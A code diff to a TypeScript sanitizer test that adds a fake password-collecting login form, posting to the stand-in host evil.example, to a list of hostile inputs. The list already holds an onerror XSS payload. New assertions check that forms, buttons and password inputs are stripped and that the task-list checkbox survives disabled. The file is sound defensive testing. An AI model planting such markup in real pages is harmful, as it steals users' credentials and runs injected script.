@@ -114,6 +114,10 @@ const EVIL_CONTENT = [
   '',
   '<img src=x onerror="window.__pwned = true">',
   '',
+  '<form action="https://evil.example"><input name="pwd" type="password"><button>登录</button></form>',
+  '',
+  '- [x] 已完成',
+  '',
   '<u>保留的下划线</u>',
 ].join('\n');
 
@@ -148,6 +152,15 @@ async function main(): Promise<void> {
   assert.equal(article.querySelector('script'), null, 'script tags must be stripped');
   assert.equal(article.querySelector('[onerror]'), null, 'inline event handlers must be stripped');
   assert.equal(window.__pwned, undefined, 'no injected script may execute');
+
+  // Form controls carry no legitimate use in a rendered document and are dropped, so a
+  // pasted form cannot collect input. The GFM task-list checkbox is the one exception.
+  assert.equal(article.querySelector('form'), null, 'form elements must be stripped');
+  assert.equal(article.querySelector('button'), null, 'buttons must be stripped');
+  assert.equal(article.querySelector('input[type="password"]'), null, 'password inputs must be stripped');
+  const checkboxes = article.querySelectorAll<HTMLInputElement>('input[type="checkbox"]');
+  assert.equal(checkboxes.length, 1, 'the GFM task-list checkbox must survive');
+  assert.ok(checkboxes[0].disabled, 'the surviving checkbox must be inert');
 
   // The supported inline HTML survives sanitising, so the author keeps their formatting.
   assert.ok(article.querySelector('u'), 'preserved <u> should survive the sanitize pass');
